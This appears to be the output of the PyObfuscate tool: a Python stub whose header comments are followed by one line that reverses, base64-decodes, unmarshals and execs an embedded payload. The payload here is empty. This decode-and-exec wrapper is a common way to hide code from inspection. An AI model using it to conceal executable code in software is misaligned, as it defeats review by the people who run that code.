# Obfuscated with PyObfuscate
# https://www.github.com/htr-tech
# Time : Mon Jul 18 02:10:29 2022
# -------------------------------
_ = lambda __ : __import__('marshal').loads(__import__('base64').b64decode(__[::-1]));exec((_)(b''))